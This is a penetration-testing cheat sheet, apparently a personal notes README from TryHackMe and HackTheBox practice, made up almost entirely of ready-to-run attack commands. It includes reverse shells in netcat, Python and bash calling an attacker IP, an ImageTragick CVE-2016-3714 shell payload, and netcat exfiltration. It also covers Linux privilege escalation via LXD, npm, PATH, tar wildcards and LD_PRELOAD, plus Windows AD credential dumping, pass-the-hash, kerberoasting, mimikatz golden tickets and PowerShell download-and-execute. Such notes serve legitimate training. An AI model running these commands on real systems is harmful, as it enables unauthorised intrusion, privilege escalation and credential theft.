# HackNotes

This repository contains my personal notes and tricks that I've gathered while working on various machines in the TryHackMe and HackTheBxo platforms. These notes serve as a guide for penetration testing and help me document my progress and findings.

Please note that these notes are a work in progress, and I'll be continuously adding more content as I progress through the challenges and machines.

## Introduction
In this repository, you will find a compilation of various tricks, commands, and techniques that can be useful during penetration testing activities. These notes are intended to assist in the process of hacking and securing systems.

### [tricks](./other/tricks.md)
### [web](./other/web.md)
---
#### Reverse shells
```nc
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.22.27 4444 >/tmp/f
```
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.22.27",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.22.27",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```
```bash
bash -i >& /dev/tcp/10.18.22.27/4444 0>&1
```
<details><summary>CVE-2016–3714</summary>

```
cat > image.png << EOF
push graphic-context
encoding "UTF-8"
viewbox 0 0 1 1
affine 1 0 0 1 0 0
push graphic-context
image Over 0,0 1,1 '|/bin/bash -i > /dev/tcp/10.8.50.72/4444 0<&1 2>&1'
pop graphic-context
pop graphic-context
EOF
```
</details>

---
#### File Transfer on `Netcat`

1. To download a file on the remote shell:
```nc
nc ATTACKER_IP ATTACKER_PORT < [file_to_download]
```
2. To receive the file on the attacker machine:
```nc
nc -l ATTACKER_PORT > [output_file_path]
```
#### Transfer files using `scp`:
```
scp backup.zip toor@192.168.122.30:/home/username_of_remote_host
```

---
### Linux Privilege Escalation:
<details><summary> LXD container exploitation </summary> 

```bash
wget archive
lxc image import ./archive --alias myimage
lxc image list
lxc init myimage ignite -c security.privileged=true # If not working, use FINGERPRINT
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
```
</details>
<details><summary> with doas </summary>

```bash
doas -u root openssl enc -in file
doas -u root /bin/bash
```
</details>
<details><summary> with npm -u </summary>

```bash
mkdir ~/tmp
echo '{"scripts": {"preinstall": "/bin/sh"}}' > ~/tmp/package.json
sudo -u serv-manage /usr/bin/npm -C ~/tmp/ --unsafe-perm i
```
</details>

<details><summary>PATH</summary>

```bash
echo /bin/sh > curl
chmod 777 curl
export PATH=/tmp:$PATH
./app_that_calls_curl
```

</details>

<details><summary>tar</summary>

```bash
cat > /home/andre/backup/rev << EOF
#!/bin/bash
rm /tmp/f
mkfifo /tmp/f
cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.22.27 4444 >/tmp/f
EOF
echo "" > "/home/andre/backup/--checkpoint=1"
echo "" > "/home/andre/backup/--checkpoint-action=exec=sh rev"
chmod +x rev
```
</details>

<details><summary>env_keep += LD_PRELOAD</summary>

```
cd /tmp
cat > shell.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}
EOF
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/sky_backup_utility
```

</details>

#### information gathering
```bash
cat /proc/version
cat /etc/issue
cat /etc/sudoers
ps aux | grep cron
ps
env
ip route
uname -a
netstat # -at -l -t -tp -i
netstat -tupln | grep LISTEN
ss -atur
find / -writable 2>/dev/null
find / -mtime 10 #find files that were modified in the last 10 days
find . -name flag.txt
find / -type d -name config #find the directory named config under “/”
find / -type f -user <user> 2>/dev/null #find files owned by user
find / -type f -perm /4000 2>/dev/null
find / -type f -group <group> -exec ls -l {} + 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/exports #file sharing
nmap --script=vuln <ip>
cat /proc/1/cgroup #if u in docker
```
quik one-line bash script with colorful output to enumerate linux machine
```bash
for cmd in "history" "id" "echo $PATH" "cat /etc/crontab" "sudo -V " "cat /proc/version" "cat /etc/issue" "cat /etc/sudoers" "cat /etc/sudoers.d" "env" "ip route" "uname -a" "netstat -tupln | grep LISTEN" "find / -type f -perm /4000 2>/dev/null" "getcap -r / 2>/dev/null" "cat /etc/exports" "cat /proc/1/cgroup"; do echo  "\n\033[1;34mCommand: $cmd\033[0m"; echo "\033[1;32m$(eval $cmd)\033[0m"; echo  "\033[1;33m\n===================================================================================================\n==================================================================================================="; done
```

#### links
* [linPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
* [linEnum](https://github.com/rebootuser/LinEnum)
* [LES](https://github.com/mzet-/linux-exploit-suggester)
* [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
* [linux Priv Checker](https://github.com/linted/linuxprivchecker)
* [Linux Kernel CVEs](https://www.linuxkernelcves.com/cves)
* [GTFOBins (unix)](https://gtfobins.github.io/)
* [g0tmi1k priv esc linux](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
* [linux backdoors](/other/src/linux_backdoors.md)


---

### Windows

<details><summary> windows system tools </summary>
<details><summary> Local User and Group Management </summary>
It is a shell application to manage Windows system administrator applications.

```bash
lusrmgr.msc
```
</details>
<details> <summary> System Configuration utility </summary>

for diagnose startup issues

```bash
MSConfig
```
</details>
<details> <summary> Task Manager </summary>

to manage (enable/disable) startup items. 
```bash
taskmgr
```
</details>
<details> <summary> User Account Control </summary>
helps prevent unauthorized changes (which may be initiated by applications, users, viruses, or other forms of malware) to an operating system

```bash
UserAccountControlSettings.exe
```
</details>
<details> <summary> Computer Management </summary>
the process of managing, monitoring and optimizing a computer system for performance, availability, security

```bash
compmgmt
```
</details>
<details> <summary> System Information </summary> 
(gathers information about your computer and displays a comprehensive view of your hardware, system components, and software environment, which you can use to diagnose computer issues.)

```bash
msinfo32
```
</details>
<details> <summary> Resource Monitor </summary>
displays per-process and aggregate CPU, memory, disk, and network usage information, in addition to providing details about which processes are using individual file handles and modules

```bash
resmon
```
</details>
<details> <summary> Windows Registry </summary>
central hierarchical database used to store information necessary to configure the system for one or more users, applications, and hardware devices

```bash
regedit
```
</details>
<details><summary>Group policy objects</summary>
a collection of settings that can be applied to OUs
</details>

<details><summary>PowerShell enumeration</summary>

view all of the hidden files in the current directory
```bash
Get-ChildItem -File -Hidden -ErrorAction SilentlyContinue
```
</details>
</details>

<details><summary> SMB enumeration </summary>

enumerate

```bash
enum4linux -h
```
open SMB shares

```bash
smbclient -L $IP
smbclient //$IP/share # -c 'recurse;ls' 
```

enumeration
```bash
smbmap -H $IP
smbmap -H '$IP' -u '' -p '' -R 
smbmap -H '$IP' -u '' -p '' -R -A 'enter.txt' #download file
```

scan with nmap

```bash
nmap -p 139,445 -Pn -script smb-enum* $IP
nmap -p 139,445 -Pn -script smb-vuln* $IP
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse $IP
```

connect with smbclient

```bash
smbclient \\\\$IP\\nt4wrksv
```

</details>

<details><summary>rdp </summary>

```bash
rdesktop -u <username> -p <password> $IP -g 70% -r disk:folder=/home/toor/cd/apps
rdesktop -u Administrator -d CONTROLLER $IP
remmina 
```

</details>

<details><summary>AD</summary>

extract credentials and secrets from a systemdump
```bash
impacket-secretsdump <domain.local>/<user>:<password>@<ip> 
``` 

where we can pht
```bash
crackmapexec smb <ip>/24 -u '<username>' -H <hash> --local-auth                                
```

login with pht
```bash
impacket-psexec <username>@<ip> -hashes <hash>
```

Responder is a LLMNR, NBT-NS and MDNS poisoner, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting
```bash
responder -I eth0 -rdwv
```

DNSRecon - is a powerful DNS enumeration script
```bash
dnsrecon -d <IP> -t axfr
use auxiliary/gather/enum_dns #with metasploit
```

upload file with cmd
```bash
certutil -split -f -urlcache http://<your IP>/file_to_download
powershell -c 'IEX(New-Object Net.WebClient).downloadstring("http://<your_ip>/<file>")' #execute file without download (!!)
```

evil-winrm - Windows Remote Management (if 5985 or 5986 ports are open)
```bash
evil-winrm -u <username> -p <password> -i <ip>
upload <file on your ps directory> #to upload file
```

kerberoasting
```bash
sudo ntpdate <target ip>
impacket-GetUserSPNs domain.local/Admin:passwd -dc-ip $IP -request
```

runas.exe (to inject the credentials into memory)
```bash
runas.exe /netonly /user:<domain>\<username> cmd.exe
```

mimikatz
```bash
privilege::debug #ensure that the output is "Privilege '20' ok"
lsadump::lsa /patch #dump hashes
lsadump::lsa /inject /name:krbtgt # dumps hash and security id of kerb ticket
kerberos::golden /user: /domain: /sid: /krbtgt: /id: #create a golden ticket!
misc::cmd #open cmd with elevated priveleges to all machines
```

links
* [WADComs (AD)](https://wadcoms.github.io/)

</details>

<details><summary>enumeration</summary>

run powershell with bypass execution policy
```bash
powershell -ep bypass
```

```powershell
whoami /priv #/groups
net user
net users
net localgroups
net user <user>
net group /domain
net user /domain
net user <user> /domain
Get-ADUser(Get-ADGroup) -Identity <user(group)> -Server <domain> -Properties *
Get-ADUser -Filter 'Name -like "*<user>"' -Server <domain> | Format-Table Name,SamAccountName -A
Get-ADUser -Filter 'Name -like "*stevens"' -Server <domain> | Format-Table Name,SamAccountName -A
Get-ADObject -Filter 'badPwdCount -gt 0' -Server za.tryhackme.com
Get-ADDomain
netsh firewall show state
netsh firewall show config
netstat -ano
findstr /si password *.txt # .xml .ini
findstr /spin "password" *.*
dir /s *pass* == *cred* == *vnc* == *config*
```

PowerView.ps1
powershell
Invoke-ShareFinder
Windows 10 Enterprise Evaluation
get-netuser | select cn #enum domain users
Get-NetGroup -GroupName *admin* #enum domain groups
```

meterpreter
```bash
run post/multi/recon/local_exploit_suggester #in session
getsystem
getprivs
load kiwi #download mimikatz
```


- [powerview](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
- [windows-exploit-suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [winpeas](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
- [sushant747 win priv esc](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html)(with vpn)
- [LOLBAS (windows)](https://lolbas-project.github.io/)
- [JAWS](https://github.com/411Hall/JAWS)
- [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)


</details>

---

### links
* [database with CVE exploits](https://cvexploits.io/)
* [explainshell.com](https://explainshell.com/)
* [reverse shells](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
* [rapid7](https://www.rapid7.com/)
* [attackerkb](https://attackerkb.com/)
* [cve.mitre.org](https://cve.mitre.org/cve/)
* [exploit-db](https://www.exploit-db.com/)
* [WTFBINS (cve)](https://wtfbins.wtf/)
* [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/)
* [hacktricks](https://book.hacktricks.xyz)
* [bash cheatsheet](https://devhints.io/bash)
* [enumeration guide](https://github.com/beyondtheoryio/Enumeration-Guide)

####  Encoding techniques:
- [splitbrain](https://www.splitbrain.org/_static/ook/)
- [hashes](https://hashes.com/en/tools/hash_identifier)
- [md5hashing](https://md5hashing.net/hash)
- [cyberchef](https://gchq.github.io/CyberChef/)
- [free pass hash cracker](https://crackstation.net/)
- [crack station](https://crackstation.net/)
- [md5decrypt.net](https://md5decrypt.net/en/)
- [vigenere brute force](https://www.guballa.de/vigenere-solver)

#### Tools

* [Git research](https://github.com/internetwache/GitTools)
* [php-jpeg-injector](https://github.com/dlegs/php-jpeg-injector)
* [RustScan](https://github.com/RustScan/RustScan/wiki/Installation-Guide)
* [subchase](https://github.com/tokiakasu/subchase)(subdomains)
* [nmmapper.com](https://www.nmmapper.com/sys/tools/subdomainfinder/)(subdomains)
* [SSRFire](https://github.com/ksharinarayanan/SSRFire)
* [reconftw](https://github.com/six2dez/reconftw)
* [google dorks](/other/src/dorks.md)
* [aquatone](https://github.com/michenriksen/aquatone/releases/tag/v1.7.0)(screenshots)
* [httpx](https://github.com/projectdiscovery/httpx)
* [nuclei](https://github.com/projectdiscovery/nuclei)
* [meg](https://github.com/tomnomnom/meg)
* [arjun](https://github.com/s0md3v/Arjun)(http param discovery)

---
Happy hacking!
